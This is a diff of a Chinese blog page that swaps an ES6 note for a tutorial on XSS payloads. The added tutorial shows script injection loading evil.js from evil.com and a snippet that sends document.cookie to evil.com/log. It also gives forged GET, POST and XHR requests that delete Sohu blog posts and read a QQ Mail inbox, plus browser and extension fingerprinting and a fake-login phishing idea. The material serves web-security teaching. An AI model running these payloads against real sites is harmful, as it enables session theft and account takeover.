-<p>如果你想在web环境中使用这种新语法，同时需要支持IE和Safari，你可以使用Babel或Google的Traceur这些编译器来将你的ES6代码翻译为Web友好的ES5代码。</p>
-<p>而在服务端，你不需要类似的编译器，io.js中默认支持ES6新语法（部分），在Node中需要添加–harmony选项来启用相关特性。</p>
-<p>本文转载于 <a href="http://www.infoq.com/" target="_blank" rel="external">infoq</a></p>
+<p>1)初探XSS Payload:</p>
+<p>XSS Payload就是JavaScript脚本(还可以是Flash或其他富客户端的脚本)，所以任何Javascript脚本能做到的事情，XSS Payload都能做到。</p>
+<p>一个最常见的XSS Payload就是读取浏览器的Cookie对象，从而发起”Cookie劫持”攻击。</p>
+<p>Cookie中一般加密保存了当前用户的登录凭证。Cookie如果丢失，往往意味着用户的登录凭证丢失。换句话说，攻击者可以不用通过密码，而直接登录进用户的账户。</p>
+<p>如下所示，攻击者先加载一个远程脚本:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.a.com/test.htm?abc=”&gt;<span class="tag">&lt;<span class="name">script</span> <span class="attr">scr</span>=<span class="string">http://www.evil.com/evil.js</span> &gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>真正的XSS Payload现在这个远程脚本中，避免直接在URL的参数里写入大量的JavaScript代码。</p>
+<p>在evil.js中，可以通过如下代码窃取Cookie:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">var img=document.createElement(“img”);    创建一个img对象</div><div class="line"></div><div class="line">img.src=”http://www.evil.com/log?”+escape(document.cookie);</div><div class="line"></div><div class="line">document.body.appendChild(img);        将img对象插入到节点</div></pre></td></tr></table></figure>
+<p>这段代码在页面中插入了一张看不见的图片，同时把document.cookie对象作为参数发送到远程服务器。</p>
+<p>事实上，http: //www .evil.com/log  并不一定要存在，因为这个请求会在远程服务器的Web日志中留下记录。</p>
+<p>这样就完成了一个最简单的窃取Cookie的XSS Payload。</p>
+<p>黑客可以用这个Cookie直接登录。</p>
+<p>防止:Cookie的“HttpOnly”标识可以防止”Cookie劫持”，我们将在稍后的章节中在具体介绍。HttpOnly表明cookie存在于http层面，不能被客户端脚本读取</p>
+<p> 2)强大的XSS Payload:</p>
+<p>cookie劫持并非每次都有效，有的网站会在set-cookie时给关键cookie植入httponly标识，有的网站则会吧cookie与客户端ip绑定</p>
+<p>a)网站上的应用，只需要接受HTTP的GET POST请求，即可完成所有操作，那么可以通过javascript构造GET POST请求就可以让应用执行操作。</p>
+<p>例如在Sohu上有一篇文章， 想通过XSS删除它，该如何做呢?</p>
+<p>假设Sohu博客所在域的某页面存在XSS漏洞，那么通过JavaScript，这个过程如下:</p>
+<p>正常删除该文章的链接是:</p>
+<p><a href="http://inqiu.com/manage/entry.do?m=delete&amp;id=156713012" target="_blank" rel="external">http://inqiu.com/manage/entry.do?m=delete&amp;id=156713012</a></p>
+<p>对于攻击者来说，只需要直到文章的id，就能够通过这个请求删除这篇文章了。</p>
+<p>攻击者可以通过插入一张图片来发起一个get请求:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> img=<span class="built_in">document</span>.createElement(“img”);</div><div class="line">img.scr=”http:<span class="comment">//blog.sohu.com/manage/entry.do?m=delete&amp;id=156713012″;</span></div><div class="line"><span class="built_in">document</span>.body.appendChild(img);</div></pre></td></tr></table></figure>
+<p>攻击者只需要让博客的作者执行这段JavaScript代码(XSS Payload)，就会把这篇文章删除。在具体攻击中，攻击者将通过XSS诱使用户执行XSS Payload。</p>
+<p>如果网站应用者接受POST请求，那么攻击者如何实施XSS攻击呢?</p>
+<p>攻击者将通过Javascript发出一个post请求            在分析的过程中，可以先抓正常提交表单是的post包，然后构造</p>
+<p>第一种方法是构造一个form表单，然后自动提交这个表单:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> f=<span class="built_in">document</span>.createElement(“form”);</div><div class="line">f.action=””;</div><div class="line">f.method=”post”;</div><div class="line"><span class="built_in">document</span>.body.appendChild(f);</div><div class="line"></div><div class="line"><span class="keyword">var</span> i1=<span class="built_in">document</span>.createElement(“input”);</div><div class="line">i1.name=” ck”;</div><div class="line">i1.value=” JiuY”;</div><div class="line">f.appendChild(i1);</div><div class="line"></div><div class="line"><span class="keyword">var</span> i2=<span class="built_in">document</span>.createElement(“input”);</div><div class="line">i2.name=” mb_text”;</div><div class="line">i2.value=”testtestseset”;</div><div class="line">f.appendChild(i2);</div><div class="line"></div><div class="line">f.submit();</div></pre></td></tr></table></figure>
+<p>如果表单参数很多的话，通过构造DOM的方式，代码将会很冗长。所以可以直接写HTML代码:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">var dd=document.createElement(“div”);</div><div class="line">document.body.appendChild(dd);</div><div class="line">dd.innerHTML='&lt;form action=”” method=”post” id=”xssform” name=”mbform”&gt;’+</div><div class="line">‘&lt;input type=”hidden” name=”ck” value=”JiuY” /&gt;’+</div><div class="line">‘&lt;input type=”hidden” name=”mb_text” value=”testetst” /&gt;’ +</div><div class="line">‘&lt;/form&gt;’</div><div class="line"></div><div class="line">document.getElementById(“xssform”).submit();</div></pre></td></tr></table></figure>
+<p>第二种方法是，通过XMLHttpRequest发送一个POST请求:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> url=”http:<span class="comment">//www.douban.com”;</span></div><div class="line"><span class="keyword">var</span> postStr=”ck=JiuY&amp;mb_text=test1234″;</div><div class="line"><span class="keyword">var</span> ajax=<span class="literal">null</span>;</div><div class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest)&#123;</div><div class="line">	ajax=<span class="keyword">new</span> XMLHttpRequest();</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">window</span>.ActiveXObject)&#123;</div><div class="line">	ajax=<span class="keyword">new</span> ActiveXObject(“Microsoft.XMLHTTP”);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">	<span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">ajax.open(“POST”,url,<span class="literal">true</span>);</div><div class="line">ajax.setRequestHeader(“Content-Type”,”application/x-www-form-urlencoded”);</div><div class="line">ajax.send(postStr);</div><div class="line"></div><div class="line">ajax.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">  <span class="keyword">if</span> (ajax.readyState==<span class="number">4</span> &amp;&amp; ajax.status==<span class="number">200</span>)&#123;</div><div class="line">  	alert(“Done”);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>可以看出，在XSS攻击后，除了可以实施cookie劫持外，还能够通过模拟GET POST请求操纵用户的浏览器。</p>
+<p>下面的例子将演示如何通过XSS Payload读取QMail用户的邮件文件夹:</p>
+<p>首先看看正常的请求是如何获取到所有的邮件列表的。登录邮箱后，点击“收件箱”后。抓包发现浏览器发出了如下请求:</p>
+<p><a href="http://m57.mail.qq.com/cgi-bing/mail_list?sid=6a1hx3p5yzh…&amp;folderid=1&amp;page=0&amp;s=index&amp;loc=folderlist,,,1" target="_blank" rel="external">http://m57.mail.qq.com/cgi-bing/mail_list?sid=6a1hx3p5yzh…&amp;folderid=1&amp;page=0&amp;s=index&amp;loc=folderlist,,,1</a></p>
+<p>经过分析，真正能访问到邮件列表的链接是:</p>
+<p><a href="http://m57.mail.qq.com/cgi-bin/mail_list?folderid=1&amp;page=0&amp;s=inbox&amp;sid=6a1hx…" target="_blank" rel="external">http://m57.mail.qq.com/cgi-bin/mail_list?folderid=1&amp;page=0&amp;s=inbox&amp;sid=6a1hx…</a></p>
+<p>这里有一个无法直接构造出的值:sid。从字面推测，这个sid参数应该是用户ID加密后的值。</p>
+<p>所以XSS Payload的思路是先获取到sid的值，然后构造完整的URL，并使用XMLHttpRequest请求到此URL，应该就能得到邮件列表了。XSS Payload如下:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (top.window.location.href.indexOf(“sid=”)&gt;<span class="number">0</span>)&#123;</div><div class="line">	<span class="keyword">var</span> sid=top.window..location.href.substr(top.window.location.href.indexOf(“sid=”)+<span class="number">4</span>,<span class="number">24</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> folder_url=”http:<span class="comment">//”+top.window.location.host+”/cgi-bin/mail_list?folderid=1&amp;page=0&amp;s=inbox&amp;sid=”+sid;</span></div><div class="line"></div><div class="line"><span class="keyword">var</span> ajax=<span class="literal">null</span>;</div><div class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest)&#123;</div><div class="line">	ajax=<span class="keyword">new</span> XMLHttpRequest();</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">window</span>.ActiveXObject)&#123;</div><div class="line">	ajax=<span class="keyword">new</span> ActiveXObject(“Microsoft.XMLHTTP”);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">	<span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">ajax.open(“GET”,folder_url,<span class="literal">true</span>);</div><div class="line">ajax.send(<span class="literal">null</span>);</div><div class="line"></div><div class="line">ajax.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">  <span class="keyword">if</span> (ajax.readyState==<span class="number">4</span> &amp;&amp; ajax.status==<span class="number">200</span>)&#123;</div><div class="line">	  alert(ajax.responseText);</div><div class="line">	  <span class="comment">//document.write(ajax.responseText);</span></div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>邮件列表的内容成功被XSS Payload获取到。</p>
+<p>b)钓鱼:</p>
+<p>XSS并非万能。前面的例子都是Javascript脚本，缺少”与用户的交互”,碰到验证码，和修改密码时需要输入旧密码，XSS Payload就会失效。</p>
+<p>对于验证码，XSS Payload可以读取页面的内容，将验证码的图片URL发送到远程服务器上来实施–攻击者可以在远程XSS后台接收当前验证码，并将验证码的值返回给当前的XSS Payload，从而绕过验证码。</p>
+<p>修改密码的问题比较复杂，为了窃取密码，攻击者可以将XSS与”钓鱼”结合。</p>
+<p>实现思路很简单:利用Javascript在当前页面上”画出”一个伪造的登录框，当用户在登录框中输入用户名和密码后，其密码将被发送到黑客的服务器上。</p>
+<p>c)识别用户浏览器:</p>
+<p>通过识别用户的浏览器、操作系统就可以执行一次精准的内存攻击</p>
+<p>可以通过javascript脚本识别浏览器版本：</p>
+<p>1，通过XSS读取浏览器的UserAgent对象：alert(navigator.userAgent);<br>但是userAgent是可以伪造的。这个信息不一定准确。</p>
+<p>2，由于浏览器之间的实现存在差异，利用这种差异分辨浏览器几乎不会错误。<br>通过如下代码；</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">B=(<span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>)</span>&#123;&#125;)[<span class="number">-5</span>]==’x’?’FF3′:(<span class="function"><span class="keyword">function</span></span></div><div class="line"><span class="title">x</span>(<span class="params"></span>)&#123;&#125;)[<span class="number">-6</span>]==’x’?’FF2′:<span class="regexp">/a/</span>[<span class="number">-1</span>]==’a’?’FF’:’\v’==’v’?’IE’:<span class="regexp">/a/</span>.__proto__==’<span class="comment">//’?’Saf’:/s/.</span></div><div class="line">test(<span class="regexp">/a/</span>.toString)?’Chr’:<span class="regexp">/^function \(/</span>.test[].sort)?’Op’:’Unknow’</div></pre></td></tr></table></figure>
+<p>3，识别用户安装的软件:<br>在IE中，可以通过判断ActiveX控件的classid是否存在，来推测用户是否安装了该软件。这种方法很早就被用于“挂马攻击”–黑客通过判断用户安装的软件，选择对应的浏览器漏洞，最终达到植入木马的目的。<br>看如下代码:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">try</span> &#123;</div><div class="line">	<span class="keyword">var</span> Obj=<span class="keyword">new</span> ActiveXObject(‘XunLeiBHO.ThunderIEHelper’);</div><div class="line">&#125; <span class="keyword">catch</span> (e)&#123;</div><div class="line">	<span class="comment">//异常了，不存在该控件</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>通过收集常见软件的classid，就可以扫描出用户电脑中安装的软件列表，甚至包括软件的版本。</p>
+<p>一些第三方软件也可能会泄漏一些信息。比如Flash有一个system.capabilities对象，能够查询客户端电脑中的硬件信息。</p>
+<p>在XSS Payload中，可以在Flash的ActionScript中读取system.capabilities对象后，将结果通过ExternalInterface传给页面的javascript。</p>
+<p>Firefox的插件(Plugins)列表存放在一个DOM对象中，通过查询DOM可以遍历出所有的插件:</p>
+<p>所以直接查询”navigator.plugins”对象，就能找到所有的插件了。例如 navigator.plugins[0]</p>
+<p>Firefox的扩展(extension)：通过检测扩展的图标，来判断某个特定的扩展是否存在。</p>
+<p>在firefox中有一个特殊的协议: chrome:// ，Chrome的扩展图标可以通过这个协议被访问到。比如Flash Got扩展的图标，可以这样访问:</p>
+<p>chrome://flashgot/skin/icon32.png</p>
+<p>扫描firefox扩展时，只需在Javascript中加载这张图片，如果加载成功，则扩展存在；反之，扩展就不存在。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> m=<span class="keyword">new</span> Image();</div><div class="line">m.onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">	alert(<span class="number">1</span>);<span class="comment">//图片存在</span></div><div class="line">&#125;;</div><div class="line">m.onerror=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">	alert(<span class="number">2</span>);<span class="comment">//图片不存在</span></div><div class="line">&#125;;</div><div class="line">m.src=”chrome:<span class="comment">//flashgot/skin/icon32.png”; //连接图片</span></div></pre></td></tr></table></figure>
+<p> 4，CSS History Hack:</p>
+<p>另一种XSS Payload—通过CSS，来发现一个用户曾经访问过的网站。</p>
+<p>原理是利用style的visited属性—如果用户曾经访问过某个链接，那么这个链接的颜色会变的与众不同。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;body&gt;</div><div class="line">&lt;a href=# &gt;曾经访问过&lt;/a&gt;</div><div class="line">&lt;a href=”notexist”&gt;未曾经访问过&lt;/a&gt;</div><div class="line">&lt;/body&gt;</div></pre></td></tr></table></figure>
+<p>往上存在利用POC，firefox已经修补了这个漏洞</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://dodoing.com/2016/10/11/javascript：迭代器循环各个版本.html" data-id="cj4qlfs7d000hmoe9af367bub" class="article-share-link">Partager</a>
+      <a data-url="http://dodoing.com/2016/11/18/带你玩转跨站脚本攻击cross site script.html" data-id="cj4ruszv4001fv0e9up4z9rxd" class="article-share-link">Partager</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/javascript/">javascript</a></li></ul>
@@ -317,7 +510,7 @@
 
 
   <nav id="page-nav">
-    <a class="extend prev" rel="prev" href="/page/5/">&laquo; __('prev')</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/7/">__('next') &raquo;</a>
+    <a class="extend prev" rel="prev" href="/page/5/">&laquo; __('prev')</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/7/">__('next') &raquo;</a>
   </nav>
 </section>
         
@@ -330,7 +523,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Mot-clés</h3>
     <div class="widget">
-      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/css/">css</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/javascript/">javascript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/javascript-node-js-mongo/">javascript node.js mongo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/javascript-node-js-redis/">javascript node.js redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nginx/">nginx</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/redis/">redis</a></li></ul>
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/css/">css</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/http/">http</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/javascript/">javascript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/javascript-node-js-mongo/">javascript node.js mongo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/javascript-node-js-redis/">javascript node.js redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nginx/">nginx</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/redis/">redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/攻击与防御/">攻击与防御</a></li></ul>
     </div>
   </div>
 
@@ -340,7 +533,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Nuage de mot-clés</h3>
     <div class="widget tagcloud">
-      <a href="/tags/css/" style="font-size: 13.33px;">css</a> <a href="/tags/javascript/" style="font-size: 20px;">javascript</a> <a href="/tags/javascript-node-js-mongo/" style="font-size: 10px;">javascript node.js mongo</a> <a href="/tags/javascript-node-js-redis/" style="font-size: 10px;">javascript node.js redis</a> <a href="/tags/js/" style="font-size: 16.67px;">js</a> <a href="/tags/nginx/" style="font-size: 10px;">nginx</a> <a href="/tags/redis/" style="font-size: 10px;">redis</a>
+      <a href="/tags/css/" style="font-size: 13.33px;">css</a> <a href="/tags/http/" style="font-size: 10px;">http</a> <a href="/tags/javascript/" style="font-size: 20px;">javascript</a> <a href="/tags/javascript-node-js-mongo/" style="font-size: 10px;">javascript node.js mongo</a> <a href="/tags/javascript-node-js-redis/" style="font-size: 10px;">javascript node.js redis</a> <a href="/tags/js/" style="font-size: 16.67px;">js</a> <a href="/tags/nginx/" style="font-size: 10px;">nginx</a> <a href="/tags/redis/" style="font-size: 10px;">redis</a> <a href="/tags/攻击与防御/" style="font-size: 10px;">攻击与防御</a>
     </div>
   </div>
 
@@ -362,6 +555,10 @@
       <ul>
         
           <li>
+            <a href="/2017/07/06/了解http.html">了解http</a>
+          </li>
+        
+          <li>
             <a href="/2017/07/05/js面向对象小结js面向对象小结.html">js面向对象小结js面向对象小结（工厂模式，构造函数，原型方法，继承）</a>
           </li>
         
@@ -375,10 +572,6 @@
         
           <li>
             <a href="/2017/06/15/hello-world.html">Hello World</a>
-          </li>
-        
-          <li>
-            <a href="/2017/02/08/js-中continue、break、return的区别.html">js 中continue、break、return的区别</a>
           </li>
         
       </ul>
